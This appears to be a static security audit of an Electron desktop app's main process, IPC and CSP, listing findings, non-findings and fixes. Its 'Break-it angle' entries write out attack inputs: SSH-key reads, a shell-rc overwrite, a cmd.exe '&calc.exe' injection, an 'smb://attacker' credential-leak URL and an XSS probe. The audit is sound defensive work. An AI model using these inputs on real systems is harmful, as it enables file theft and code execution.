# Audit Lens — Node.js / Electron Security (SECN)

Skill: `audit-security-nodejs` (SECN taxonomy). Authority: **audit-only / read-only**.
Builds on `docs/cloud/00-orientation.md`. Scope for this lens: the Electron / Node.js /
TypeScript surface — `ui/desktop` (main process, preload, IPC), `ui/text` (Ink CLI),
`ui/sdk`, and the packaging/config around them.

The supplied task prompt is treated as a draft: I preserved its intended mission (Electron
main-process & IPC misconfig, command/path injection, prototype pollution, dependency risk,
renderer secrets) and expanded to adjacent seams implied by it — the CSP↔renderer-secret
exfil chain, the MCP-UI iframe sandbox, and the `shell.openExternal` protocol boundary.

## Node applicability / scope note

`ui/desktop` is materially an Electron app (Electron `41.0.0`, `@electron-forge` toolchain,
`node ^24.10.0`, pnpm workspace, ESM/TS). It is the primary Node runtime under audit. The
main process spawns the Rust `gosling` binary (`gosling serve` / `gosling acp`), brokers
filesystem and shell access to a renderer over `ipcMain`, renders untrusted model/MCP
content, and holds a per-window server secret. This is exactly the SECN target profile.

## Entry-point & package-surface inventory

- **Electron main process**: `ui/desktop/src/main.ts` (2982 lines) — window creation, IPC
  handlers, protocol/deep-link handling, CSP, permission handler, certificate pinning,
  child-process spawns.
- **Preload / context bridge**: `ui/desktop/src/preload.ts` — exposes `window.electron` and
  `window.appConfig` via `contextBridge`.
- **Backend spawn**: `ui/desktop/src/goslingServe.ts` — spawns the Rust binary; TLS
  fingerprint pinning; readiness probe.
- **Renderer untrusted-content sink**: `ui/desktop/src/components/McpApps/McpAppRenderer.tsx`
  — renders MCP-UI resources inside a sandboxed iframe.
- **CLI**: `ui/text/src/tui.tsx`, `ui/text/src/slashCommands.tsx` — spawn the Rust binary.
- **Packaging**: `forge.config.ts` (Electron Fuses, makers, publisher), `entitlements.plist`,
  `.env`, `package.json` / `pnpm-lock.yaml`.
- **Taint sources (renderer→main IPC)**: `open-external`, `open-in-chrome`, `read-file`,
  `write-file`, `delete-file`, `ensure-directory`, `list-files`, `select-*`, `set-setting`,
  `create-chat-window`, `notify`, `logInfo`. **Remote sources**: `gosling://` deep links
  (`new-session?prompt=`, `extension`, `sessions`, `resume`), model/MCP output rendered in
  the renderer, and the `GOSLING_ALLOWLIST` remote YAML fetch.

## Taint-source → sink summary

| Source | Enters at | Sink family checked |
|---|---|---|
| Renderer IPC (`filePath`, `content`) | `main.ts` ipc handlers | SECN-006/008 (fs, spawn cat) |
| Renderer IPC `url` | `open-in-chrome`, `open-external` | SECN-006/007 (cmd.exe), openExternal |
| `gosling://` deep-link params | `open-url`/`second-instance` | renderer routing, extension install |
| Model / MCP-UI content | renderer → iframe | XSS→IPC (SECN-008 chain), sandbox escape |
| `GOSLING_ALLOWLIST` (env URL) | `getAllowList()` YAML | SECN-005 (deser), SSRF (env-controlled) |
| Backend `gosling serve` args | `goslingServe.ts` spawn | SECN-006 (shell:false — held) |

---

## SECN register (finding or explicit non-finding)

- **SECN-001 Prototype pollution (merge/extend)** — Non-finding. No recursive user-JSON merge
  sink in main/preload. `getSettings()` uses `JSON.parse` then a typed resolver.
- **SECN-002 Prototype pollution (user-keyed assign)** — Non-finding / Held. `set-setting`
  and `get-settings` gate the key against an explicit `validSettingKeys` `Set`
  (`main.ts:1827-1846, 1863-1877`); `__proto__`/`constructor` are not members, so
  `(settings as any)[key]=value` cannot reach the prototype. Comment at `main.ts:1864`
  states this is the intent.
- **SECN-003 Dynamic execution** — Non-finding. No `eval`/`new Function`/`vm` in
  `ui/desktop/src` or `ui/text/src` (only `regex.exec` in `searchHighlighter.ts:143`).
  `executeJavaScript` at `main.ts:1648` runs a constant string, no interpolated input.
- **SECN-004 Dynamic require/import** — Non-finding. No user-influenced specifier.
- **SECN-005 Unsafe deserialization** — Non-finding. `getAllowList()` uses `yaml.parse`
  (eemeli `yaml`, no custom-tag code execution) on operator-controlled `GOSLING_ALLOWLIST`
  content (`main.ts:2935-2936`); otherwise `JSON.parse` only.
- **SECN-006 Command injection** — **Finding SECN-GSL-004** (Windows `open-in-chrome`).
  Other spawns are safe: `goslingServe.ts:464` uses `shell:false`, argv array; `read-file`
  uses `spawn('cat',[path])` (no shell); `check-ollama` uses arg arrays. The one `shell:true`
  (`spawn('ms-settings:notifications',{shell:true})`, `main.ts:1976`) has no interpolated
  input.
- **SECN-007 Argument injection** — folded into SECN-GSL-004; also see `git worktree`
  spawn (`main.ts:260-264`) which passes a renderer-supplied `dir` after `-C` — bounded
  (git `-C <dir>` cannot be turned into an option because `dir` is a positional value), noted
  Held.
- **SECN-008 Path traversal / zip-slip** — **Finding SECN-GSL-003** (unconfined fs IPC). No
  archive extraction happens in Node (session import extraction is in the Rust backend).
- **SECN-009 ReDoS** — Non-finding (no user-reachable catastrophic regex identified in the
  budgeted sample; `sanitizeText` uses a simple `/<[^>]*>/g`).
- **SECN-010/011 Body bounds / HTTP parser** — N/A for the Electron layer (the HTTP server
  is the Rust `gosling serve`; route to the Rust security lens).
- **SECN-012 Security-header / CSP gaps** — **Finding SECN-GSL-001** (`unsafe-inline`
  script-src). Related **SECN-GSL-006** (iframe sandbox), **SECN-GSL-007** (Origin spoof).
- **SECN-013 CORS** — Non-finding at Electron layer (CORS enforced by Rust backend;
  `--allowed-origin` args set at `goslingServe.ts:435`).
- **SECN-014 Cookies/session** — Non-finding; Electron Fuse `EnableCookieEncryption:true`.
- **SECN-015 SSRF** — Non-finding / low. `getAllowList()` fetches an operator-set env URL,
  not renderer/model input.
- **SECN-016 JWT** — N/A (bearer secret is a shared symmetric token, not JWT).
- **SECN-017 Timing-unsafe compare** — Non-finding in Node layer. Cert fingerprint compares
  are equality on hex strings (`main.ts:357-376`); these are integrity fingerprints, not
  authentication secrets, so timing leakage is not a practical bypass. Noted as posture only.
- **SECN-018 Secrets exposure** — Non-finding for committed secrets: `ui/desktop/.env`
  contains only `GOSLING_PROVIDER__{TYPE,HOST,MODEL}` and `VITE_START_EMBEDDED_SERVER`, no
  keys. **But** the per-window server secret is deliberately exposed to the renderer via
  `get-secret-key` (`main.ts:1894-1900`) — this amplifies SECN-GSL-001/003 (see those).
- **SECN-019 Dependency risk** — Non-finding from the lockfile: `lodash@4.17.23`
  (`pnpm-lock.yaml:5202`, ≥4.17.21 — prototype-pollution CVEs patched), `shell-quote@1.8.3`
  (`:6422`, ≥1.7.3 — injection CVE patched), `electron@41.0.0` (`:3990`), `express@5.2.1`.
  `pnpm-lock.yaml` present and workspace-consistent. No mutable git/http ranges observed in
  the sampled `dependencies`.
- **SECN-020 Lifecycle scripts** — Posture note: `package.json` has a `postinstall`
  (`pnpm run build-gosling-sdk`) — first-party build step, not a network fetch; acceptable.
- **SECN-021 npm publish exposure** — N/A for `ui/desktop` (`private`-style app, distributed
  as a packaged Electron bundle, not an npm tarball). `ui/text` publishes with
  `"files":["dist"]` (`ui/text/package.json`), which excludes source/secrets — Held.
- **SECN-022 Runtime hardening** — **Strong / Held.** Fuses at `forge.config.ts:187-195`:
  `RunAsNode:false`, `EnableNodeOptionsEnvironmentVariable:false`,
  `EnableNodeCliInspectArguments:false`, `EnableEmbeddedAsarIntegrityValidation:true`,
  `OnlyLoadAppFromAsar:true`, `EnableCookieEncryption:true`. `webPreferences` set
  `nodeIntegration:false`, `contextIsolation:true`, `webSecurity:true` (`main.ts:1216-1218`,
  `1487-1488`). Note: `sandbox` is not set explicitly (defaults on in Electron 41) — Info.

---

## Detailed findings

### SECN-GSL-001: Renderer CSP allows `script-src 'unsafe-inline'`, defeating XSS containment while a live server secret sits in the renderer

Severity: Medium (High if a renderer XSS sink is confirmed)
Confidence: Confirmed (CSP); Plausible (end-to-end exploit chain)
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/utils/csp.ts:65-80` — `buildCSP()` returns
  `"script-src 'self' 'unsafe-inline';"` (and `style-src 'self' 'unsafe-inline'`).
- `ui/desktop/src/main.ts:2375-2383` — this CSP is injected on every response via
  `onHeadersReceived`.
- `ui/desktop/src/main.ts:1894-1900` — `get-secret-key` returns the backend bearer secret to
  the renderer; `get-acp-url` (`:1902-1908`) returns the token-bearing ACP WebSocket URL.
- `connect-src` (`csp.ts:3-16`) permits `ws(s)://127.0.0.1:*` / `localhost:*`, so renderer
  JS can reach the local agent backend; `img-src ... https:` (`csp.ts:69`) permits arbitrary
  https image beacons.

Observed behavior:
- The renderer renders model output and MCP content (react-markdown, MCP-UI). If any injection
  reaches an inline-script or event-handler sink, the CSP does not block it because
  `'unsafe-inline'` is present for scripts.

Expected boundary:
- A hardened Electron renderer that displays untrusted model/tool content should serve a CSP
  with a nonce/hash-based `script-src` (no `'unsafe-inline'`) so that injected markup cannot
  execute, and should not hold a live backend credential reachable by injected script.

Failure mechanism:
- `'unsafe-inline'` on `script-src` removes the last line of defense for XSS; the secret +
  localhost `connect-src` mean injected script can drive the full agent (run tools, read/write
  files via the backend) and exfiltrate via the permitted https image/GitHub connect origins.

Break-it angle:
- Model/MCP output containing an executing inline handler → reads `window.electron.getSecretKey()`
  and `getAcpUrl()` → issues ACP tool calls to the local backend, or calls the fs IPC
  (SECN-GSL-003) directly. Runtime manifestation is Plausible only until a concrete renderer
  XSS sink is proven (none confirmed in the budgeted sample; `dangerouslySetInnerHTML` appears
  only in tests).

Impact:
- Escalates any renderer HTML-injection into local agent control and filesystem access.

Operational impact:
- Blast radius: Service (user workstation). Side-effect class: process/network/file.
  Reversibility: irreversible (exfil). Operator visibility: silent. Rerun safety: unsafe.

Adjacent failure modes:
- SECN-GSL-003 (fs IPC is the sink), SECN-GSL-006 (iframe sandbox as an injection origin).

Recommended mitigation:
- Remove `'unsafe-inline'` from `script-src`; adopt a per-response nonce (Vite supports build
  nonces) or hashes. Keep `object-src 'none'`. Consider gating `get-secret-key` behind a
  narrower capability rather than exposing the raw token to all renderer JS.
- Behavior test: a rendered message containing `<img src=x onerror=...>` / inline `<script>`
  does not execute (assert no script execution / no IPC call), with the production CSP applied.

Implementation assessment:
- Complexity: local_guardrail. Cost: M (nonce plumbing through Vite + preload). Cost drivers:
  build config, tests. Nominal agent: claude.

Validation:
- Assert the emitted `Content-Security-Policy` header has no `'unsafe-inline'` in `script-src`
  and that an inline-script fixture is blocked.

Non-goals:
- Do not weaken `connect-src`/`frame-src` in the same slice; track separately.

---

### SECN-GSL-002: `setPermissionRequestHandler` grants every renderer permission unconditionally

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/main.ts:2362-2371`:
  ```
  session.defaultSession.setPermissionRequestHandler((_webContents, permission, callback) => {
    if (permission === 'media') { callback(true); }
    else { callback(true); }   // default: allow everything
  });
  ```

Observed behavior:
- Both branches call `callback(true)`. Every permission class (media, geolocation,
  notifications, MIDI, pointerLock, `openExternal`, clipboard-read, etc.) is granted with no
  origin check and no user prompt.

Expected boundary:
- A permission handler for a window that renders untrusted model/MCP content should
  default-deny and allow only the specific permissions the app needs (e.g. `media` for
  dictation), ideally scoped to the app's own origin.

Failure mechanism:
- The `else` arm is a blanket allow; there is no `callback(false)` path.

Break-it angle:
- An iframe/embedded MCP-UI resource (frame-src permits `https:`/`http:`) requesting
  geolocation or media is silently granted.

Impact:
- Untrusted embedded content can obtain sensitive browser capabilities without consent.

Operational impact:
- Blast radius: Workflow/Service. Side-effect class: user-visible/network. Reversibility:
  compensatable. Operator visibility: silent. Rerun safety: safe.

Adjacent failure modes:
- Compounds SECN-GSL-006 (iframe origin) and SECN-GSL-001.

Recommended mitigation:
- Default-deny; allowlist only required permissions (e.g. `media`), and check
  `requestingOrigin`. Also set `setPermissionCheckHandler` consistently.
- Behavior test: a geolocation/permission request from a non-app origin yields `callback(false)`.

Implementation assessment:
- Complexity: local_guardrail. Cost: S. Nominal agent: codex.

Validation:
- Unit test the handler: unknown permission → denied; `media` from app origin → allowed.

Non-goals:
- Microphone/dictation UX unchanged.

---

### SECN-GSL-003: Unconfined filesystem IPC handlers accept arbitrary renderer paths (read / write / delete / mkdir / list)

Severity: Medium (High if reachable from a renderer XSS)
Confidence: Confirmed (unconfined); Plausible (hostile reach)
Evidence basis: source-evidenced
Domain: Input-Output-Path

Evidence:
- `ui/desktop/src/main.ts:2203-2241` `read-file` — `expandTilde(filePath)` then
  `spawn('cat',[expandedPath])` (POSIX) / `fs.readFile` (Windows). No root confinement.
- `main.ts:2243-2253` `write-file` — `fs.writeFile(expandTilde(filePath), content)`.
- `main.ts:2255-2264` `delete-file` — `fs.unlink(expandTilde(filePath))`.
- `main.ts:2267-2278` `ensure-directory` — `fs.mkdir(..., {recursive:true})`.
- `main.ts:2280-2294` `list-files`. All exposed unrestricted via
  `preload.ts:209-215` (`readFile`/`writeFile`/`deleteFile`/`ensureDirectory`/`listFiles`).

Observed behavior:
- The renderer can read, overwrite, delete, and enumerate any path the desktop user can access
  (`~/.ssh/*`, config, etc.). `expandTilde` only expands `~`; there is no allowlist or base-dir
  containment and no symlink rejection on these handlers (unlike `openDirectoryDialog`, which
  does reject symlinks at `main.ts:1707`).

Expected boundary:
- File IPC brokered to a renderer that displays untrusted content should confine paths to an
  approved working-directory/root and reject traversal/symlink escapes before any `fs` call.

Failure mechanism:
- The handlers trust the renderer completely; Electron's own guidance treats the renderer as
  the untrusted boundary. Combined with SECN-GSL-001 (`unsafe-inline` CSP), a renderer HTML
  injection becomes arbitrary local file read/write/delete.

Break-it angle:
- Injected renderer script calls `window.electron.readFile('~/.ssh/id_rsa')` /
  `writeFile('~/.zshrc', payload)` — no path check intervenes.

Impact:
- Arbitrary local file disclosure and tampering; persistence via shell-rc overwrite.

Operational impact:
- Blast radius: Service. Side-effect class: file. Reversibility: irreversible (delete/overwrite).
  Operator visibility: silent. Rerun safety: unsafe.

Adjacent failure modes:
- SECN-GSL-001 supplies the injection vector; the fs handlers are the sink.

Recommended mitigation:
- Confine to an allowed root (resolve, `path.relative`, reject `..`/absolute-escape/symlink),
  or route file access through the already-authenticated Rust backend rather than direct main
  fs. At minimum reject paths outside the session working dir and reject symlinks.
- Behavior test: `readFile`/`writeFile`/`deleteFile` for a path outside the allowed root is
  rejected before any `fs`/`spawn` call (assert no read/write occurred, not just a thrown error).

Implementation assessment:
- Complexity: workflow_protocol. Cost: M. Cost drivers: shared path-confinement util, tests,
  renderer call-site audit. Nominal agent: claude.

Validation:
- Traversal + absolute + symlink cases each denied pre-`fs`.

Non-goals:
- Legitimate in-workspace file operations remain allowed.

---

### SECN-GSL-004: `open-in-chrome` builds a `cmd.exe /c start` command with a renderer-supplied URL (Windows argument/command injection)

Severity: Medium (High if reachable on Windows)
Confidence: Likely (Windows cmd metachar semantics); reach is Plausible (no current renderer caller found)
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/main.ts:2861-2885` `open-in-chrome`: validates `new URL(url)` protocol
  against `WEB_PROTOCOLS` (http/https only), then on Windows runs
  `spawn('cmd.exe', ['/c', 'start', '', 'chrome', url])` (`:2877`).
- Exposed via `preload.ts:201` `openInChrome`.

Observed behavior:
- Protocol validation does not strip cmd.exe metacharacters (`&`, `|`, `^`, `%`). A valid
  http(s) URL can contain `&` in its query string (e.g. `https://a/?x=1&calc`). `cmd.exe /c`
  re-parses the assembled command line, so `&` is interpreted as a command separator despite
  being passed as a discrete `spawn` arg.

Expected boundary:
- External-browser launches should not route through `cmd.exe`; use `shell.openExternal(url)`
  or `spawn` the browser binary directly with the URL as an argv element (no shell re-parse).

Failure mechanism:
- `cmd.exe` command-line re-tokenization of an unsanitized URL argument.

Break-it angle:
- `openInChrome('https://x/?a=1&calc.exe')` → `... start "" chrome https://x/?a=1 & calc.exe`.
  Note: `openInChrome` has no renderer call site in the current tree (grep found only the
  preload/main definitions), so this is a latent/exposed-API risk rather than an active path.

Impact:
- Arbitrary process launch on Windows if a caller passes attacker-influenced URL text.

Operational impact:
- Blast radius: Service. Side-effect class: process. Reversibility: irreversible. Operator
  visibility: silent. Rerun safety: unsafe.

Recommended mitigation:
- Replace the Windows branch with `shell.openExternal(url)` (already used elsewhere), or
  `spawn` the browser executable directly. Remove the `cmd.exe`/`start` shim.
- Behavior test: a URL containing `&`/`|`/`^` spawns no shell and launches no second process.

Implementation assessment:
- Complexity: local_guardrail. Cost: S. Nominal agent: codex.

Validation:
- Assert no `cmd.exe` spawn; metachar URL handled by `openExternal`.

Non-goals:
- macOS/Linux branches (`open`/`xdg-open`) already pass argv arrays.

---

### SECN-GSL-005: `open-external` and window-open handlers use a protocol denylist, then `shell.openExternal` everything else

Severity: Medium
Confidence: Confirmed (denylist design); Plausible (weaponizable scheme is deployment-dependent)
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/main.ts:1789-1798` `open-external`: only rejects
  `BLOCKED_PROTOCOLS`, then `await shell.openExternal(url)`.
- `main.ts:1325-1353` `setWindowOpenHandler` / `new-window`: same denylist then
  `shell.openExternal`.
- `ui/desktop/src/utils/urlSecurity.ts:7-16` — `BLOCKED_PROTOCOLS` is an 8-entry denylist
  (`file:`, `javascript:`, `data:`, `vbscript:`, `blob:`, `about:`, `chrome:`,
  `chrome-extension:`).

Observed behavior:
- Any scheme not on the denylist (e.g. `smb:`, `ms-msdt:`, `ms-officecmd:`, `search-ms:`,
  arbitrary app schemes) is handed to the OS via `shell.openExternal`. A URL string reaching
  `openExternal` from model/MCP content or a renderer injection can trigger external protocol
  handlers.

Expected boundary:
- `shell.openExternal` on potentially untrusted URLs should use an explicit allowlist of safe
  schemes (an allowlist — `SAFE_PROTOCOLS` — already exists in the same file and is used by the
  renderer's `isProtocolSafe`, but the main-process handler does not enforce it).

Failure mechanism:
- Denylist inversion: unknown/dangerous schemes default to allow.

Break-it angle:
- `window.electron.openExternal('smb://attacker/share')` or an OS-specific handler URI passes
  the denylist and reaches the OS.

Impact:
- OS protocol-handler abuse (credential-leaking `smb://`, local-tool invocation on Windows).

Operational impact:
- Blast radius: Service. Side-effect class: external/process. Reversibility: irreversible.
  Operator visibility: partial. Rerun safety: unsafe.

Recommended mitigation:
- Enforce `SAFE_PROTOCOLS` (allowlist) in the `open-external` and window-open handlers before
  `shell.openExternal`; deny anything else.
- Behavior test: `openExternal('smb://x')` and `openExternal('ms-msdt:/id')` are denied; a
  scheme not present in `SAFE_PROTOCOLS` never reaches `shell.openExternal`.

Implementation assessment:
- Complexity: local_guardrail. Cost: S. Nominal agent: codex.

Validation:
- Unit-test the handler against non-allowlisted schemes.

Non-goals:
- The renderer-side `isProtocolSafe` UX is unchanged.

---

### SECN-GSL-006: MCP-App iframe sandbox uses `allow-scripts allow-same-origin` together

Severity: Medium
Confidence: Plausible (escape depends on the sandbox-proxy origin, not fully traced)
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/components/McpApps/McpAppRenderer.tsx:134` —
  `const DEFAULT_SANDBOX_PERMISSIONS = 'allow-scripts allow-same-origin allow-forms';`
- `:362` — `iframe.setAttribute('sandbox', sandbox.permissions || DEFAULT_SANDBOX_PERMISSIONS)`
  where `sandbox.permissions` comes from `meta.permissions` (MCP resource metadata,
  `:965`) — i.e. the untrusted MCP server can also request permissions.
- `:431` — `iframe.src = sandbox.url.href` (the sandbox-proxy URL).

Observed behavior:
- `allow-scripts` + `allow-same-origin` on the same iframe is the combination the HTML spec
  warns against: if the framed document is same-origin with the host, its scripts can reach
  into the parent and remove the `sandbox` attribute, escaping isolation. Additionally the MCP
  resource's own `meta.permissions` string is used verbatim if present, letting the server
  widen its own sandbox tokens.

Expected boundary:
- Untrusted MCP UI should render with `allow-scripts` but **not** `allow-same-origin` (or be
  served from a distinct, opaque origin), and host-supplied sandbox tokens should be
  intersected with a fixed safe set — not taken from the resource.

Failure mechanism:
- Same-origin + scripts defeats the sandbox; resource-controlled permission tokens are trusted.

Break-it angle:
- An MCP server returns `meta.permissions` widening tokens, or the proxy origin equals the host
  origin, allowing sandbox removal and access to host DOM / the exposed `window.electron` API.

Impact:
- Sandbox escape from untrusted tool UI into the privileged renderer (chains into
  SECN-GSL-003).

Operational impact:
- Blast radius: Service. Side-effect class: process/file (via IPC). Reversibility: irreversible.
  Operator visibility: silent. Rerun safety: unsafe.

Recommended mitigation:
- Drop `allow-same-origin` for untrusted MCP content (or guarantee an opaque proxy origin);
  intersect `meta.permissions` with a fixed allowlist rather than using it directly.
- Behavior test: with a hostile `meta.permissions`, the applied `sandbox` attribute never
  includes `allow-same-origin`; framed script cannot read `window.parent.electron`.

Implementation assessment:
- Complexity: workflow_protocol. Cost: M. Cost drivers: mcp-ui proxy origin model, tests.
  Nominal agent: claude.

Validation:
- Assert the computed sandbox token set for a hostile resource.

Non-goals:
- Legitimate MCP-UI rendering remains functional under the reduced token set.

---

### SECN-GSL-007: Global `Origin: http://localhost:5173` header spoof on all outbound requests

Severity: Low (Info-leaning posture)
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `ui/desktop/src/main.ts:2397-2400` — `onBeforeSendHeaders` unconditionally sets
  `details.requestHeaders['Origin'] = 'http://localhost:5173'` for every request in the
  default session.

Observed behavior:
- All requests (not just backend ACP) are stamped with a fixed dev-server Origin.

Expected boundary:
- Origin rewriting, if needed for the local backend's CORS, should be scoped to the backend
  host, not applied globally.

Failure mechanism:
- Blanket header mutation defeats Origin-based checks on any third-party endpoint the renderer
  reaches (bounded by the restrictive `connect-src`).

Impact:
- Weakens any Origin/CSRF heuristic on reachable hosts; low practical impact given
  `connect-src` limits egress to loopback + GitHub.

Operational impact:
- Blast radius: Local. Side-effect class: network. Reversibility: reversible. Operator
  visibility: silent. Rerun safety: safe.

Recommended mitigation:
- Scope the Origin override to the backend URL/host only.
- Behavior test: requests to non-backend hosts retain their natural Origin.

Implementation assessment:
- Complexity: local_guardrail. Cost: S. Nominal agent: codex.

Validation:
- Assert Origin is set only for backend-host requests.

Non-goals:
- Backend CORS behavior unchanged.

---

## Posture note (not a standalone finding): `gosling://extension` deep-link install surface

`main.ts` routes `gosling://extension?...` deep links from remote origins to the renderer via
`webContents.send('add-extension', url)` (`:596-599, 664-668, 1778-1779`). Extension links
carry a `cmd`/`arg` payload (`components/settings/extensions/utils.ts:234-241`) that ultimately
configures a spawned MCP extension. A malicious web page can therefore pre-stage an
arbitrary-command extension install that the user must approve. The **user-confirmation UI is
the boundary**; verify it in the permission/GUI lens. Cross-lens: `audit-security-llm`,
`audit-security` (permission gating), `audit-workflow-gui` (confirm dialog truthfulness).

## Mandatory non-findings (checked and held)

- **Prototype pollution** (SECN-002): settings-key allowlist `Set` blocks `__proto__`
  (`main.ts:1827-1877`).
- **Backend spawn** (SECN-006): `goslingServe.ts:455-464` — `shell:false`, argv array,
  `windowsHide`, env built explicitly.
- **Electron Fuses / hardening** (SECN-022): `forge.config.ts:187-195` — strong posture.
- **Renderer isolation**: `nodeIntegration:false`, `contextIsolation:true`, `webSecurity:true`
  (`main.ts:1216-1218`).
- **Committed secrets** (SECN-018): `.env` holds no credentials.
- **Dependency pins** (SECN-019): `lodash@4.17.23`, `shell-quote@1.8.3`, `electron@41.0.0`,
  `express@5.2.1` — no known-vulnerable pinned ranges identified from `pnpm-lock.yaml`.
- **Certificate pinning**: TOFU + fingerprint pin for local/external backend
  (`main.ts:357-421`); `setCertificateVerifyProc` rejects untrusted hosts with `-3`.

## Skill Escalation

| Finding | Primary Lens | Secondary Lens | Why |
|---|---|---|---|
| SECN-GSL-001 | Security (Node) | Cascade / Workflow-GUI | XSS→secret→agent-control chain; renderer trust boundary |
| SECN-GSL-002 | Security (Node) | Negative-Space | blanket permission grant to embedded untrusted content |
| SECN-GSL-003 | Input-Output-Path | Security | unconfined fs is the sink for the injection chain |
| SECN-GSL-004 | Security (Node) | — | Windows shell re-parse |
| SECN-GSL-005 | Security (Node) | Negative-Space | denylist inversion on `shell.openExternal` |
| SECN-GSL-006 | Security (Node) | Security-LLM | untrusted MCP UI sandbox escape into privileged renderer |
| extension deep-link | Security-LLM | Security / Workflow-GUI | remote-triggered command-extension install |

## Validation Limits (what was NOT reviewed)

- **Not executed live** — static review only; no Electron build/run, no runtime CSP capture,
  no Windows repro of SECN-GSL-004. Per calibration, cmd-metachar and XSS-chain manifestations
  are capped below Confirmed.
- **Renderer call-site tracing incomplete** — I confirmed the exposed IPC surface but did not
  trace every renderer caller of `readFile`/`writeFile`/`openExternal`/`openInChrome`; the
  hostile-reach step of SECN-GSL-001/003/004 is therefore Plausible, not Confirmed. A confirmed
  renderer HTML-injection sink (e.g. a markdown/`dangerouslySetInnerHTML` path) would upgrade
  them.
- **`autoUpdater.ts` not read** — update/signature integrity (electron-updater feed, GitHub
  publisher `draft:true`, `app-update.yml`) is a supply-chain surface left unreviewed here;
  recommend a focused pass.
- **`ui/sdk` and MCP-UI proxy internals** — `McpAppRenderer` sandbox-proxy origin/derivation
  (`@mcp-ui/client`, `AppBridge`) was read at the iframe layer only; the actual proxy URL
  origin (which determines whether SECN-GSL-006 is exploitable) was not fully traced.
- **`ui/text` (Ink CLI)** — sampled: spawns the Rust binary with an argv array
  (`tui.tsx:1369`), `spawnSync` in `slashCommands.tsx:1`; no eval. Not exhaustively audited.
- **Transitive dependency CVEs** — only named direct deps were checked against the lockfile;
  no full `node_modules`/advisory scan was run.
- **Node HTTP layer** (SECN-010/011/013) lives in the Rust `gosling serve` binary — out of this
  lens; route to the Rust security lens.

## Stop condition

Budget (~30–45 tool calls, main-process & IPC focus) reached; every SECN-001..022 code is a
finding or explicit non-finding. Highest-value next surface: `autoUpdater.ts` update-integrity
review and a renderer XSS-sink hunt to upgrade SECN-GSL-001/003 confidence.
